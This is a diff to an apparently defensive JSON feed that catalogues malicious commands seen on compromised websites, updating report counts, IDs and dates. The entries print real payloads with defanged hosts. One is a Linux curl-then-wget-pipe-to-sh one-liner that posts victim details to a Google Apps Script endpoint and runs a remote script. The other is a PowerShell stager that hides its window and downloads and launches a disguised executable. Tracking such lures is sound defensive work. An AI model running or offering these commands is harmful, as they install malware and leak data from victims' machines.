@@ -337,10 +337,10 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 22,
-    "ReportCount": 22,
+    "DistinctPayloadCount": 24,
+    "ReportCount": 24,
     "FirstSeen": "2026-11-09T09:01:40.149000+00:00",
-    "LastSeen": "2026-11-13T18:28:15.921000+00:00",
+    "LastSeen": "2026-11-15T02:58:03.523000+00:00",
     "ReportIds": [
       "cmw9185ff2hpc0oml2t2gkjiq",
       "cmw919kau2hq20omlin08m3ae",
@@ -363,7 +363,9 @@
       "cmwd4xgzr00qh0oml10gmmayh",
       "cmwdz32o206wn0omluye82wa5",
       "cmwerxwap0e0d0omlo90ozon6",
-      "cmwfb87f30g8x0omlp6pbqff9"
+      "cmwfb87f30g8x0omlp6pbqff9",
+      "cmwh8ut7p0pca0omlsvkn7e9j",
+      "cmwh8vnll0pd20oml373zg9sc"
     ],
     "PayloadExamples": [
       "curl -sL -d \"id=0048088b-86c5-4092-8adf-ae27e12f8b11&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcompany-hamza-abbs[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T14%3A45%3A29.831Z&lastShellAt=2026-11-11T14%3A45%3A29.831Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
@@ -372,6 +374,8 @@
       "curl -sL -d \"id=0d13442a-4f8e-48da-8893-7cf782cc75d9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbienestarozempic[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T12%3A37%3A12.096Z&lastShellAt=2026-11-11T12%3A37%3A12.096Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=1ba468db-fb84-4201-9b02-7eafec91aaf8&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2F9thstreetycc[.]org%2F&os=Linux%20x86_64&lastVisitAt=2026-11-10T21%3A38%3A45.867Z&lastShellAt=2026-11-10T21%3A38%3A45.867Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=21a93fe7-8de4-49ec-bc9a-e8158d30427a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsouthwestsocialservicesinc[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T09%3A00%3A45.004Z&lastShellAt=2026-11-09T09%3A00%3A45.004Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+      "curl -sL -d \"id=2cec1242-be6b-457e-a75d-ca9b91f2604f&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbelamobili[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T02%3A56%3A00.881Z&lastShellAt=2026-11-15T02%3A56%3A00.881Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
+      "curl -sL -d \"id=31b97fa1-39da-4828-8ef2-39dd5e1ba7ce&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcleanveins[.]org%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T02%3A56%3A40.406Z&lastShellAt=2026-11-15T02%3A56%3A40.406Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=3ec21352-bff8-4e95-9cf4-6287e383ca91&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Falkhaleej-shopping[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T11%3A59%3A16.381Z&lastShellAt=2026-11-11T11%3A59%3A16.381Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=4f7a58c8-8e19-4964-b255-4d277312ae80&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fghanawebdirectory[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T09%3A34%3A02.296Z&lastShellAt=2026-11-09T09%3A34%3A02.296Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=55b9976e-6d4b-4b49-bb84-a5d7a49ad6de&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbomwin22[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T09%3A51%3A58.053Z&lastShellAt=2026-11-11T09%3A51%3A58.053Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
@@ -719,9 +723,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 39,
+    "ReportCount": 40,
     "FirstSeen": "2026-11-09T05:27:49.953000+00:00",
-    "LastSeen": "2026-11-14T23:30:04.308000+00:00",
+    "LastSeen": "2026-11-15T02:58:54.417000+00:00",
     "ReportIds": [
       "cmw8tl5kz22nz0omlh7329rch",
       "cmw8unshl24of0oml3g305qzl",
@@ -761,7 +765,8 @@
       "cmwh0vvj10mqc0oml9lg9ojng",
       "cmwh0way90mro0oml97xjcl0x",
       "cmwh14adz0mwn0oml6i65gll2",
-      "cmwh1g6lg0n080omlf2dfb4rr"
+      "cmwh1g6lg0n080omlf2dfb4rr",
+      "cmwh8wqvi0pdv0oml5gxt21oj"
     ],
     "PayloadExamples": [
       "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit"
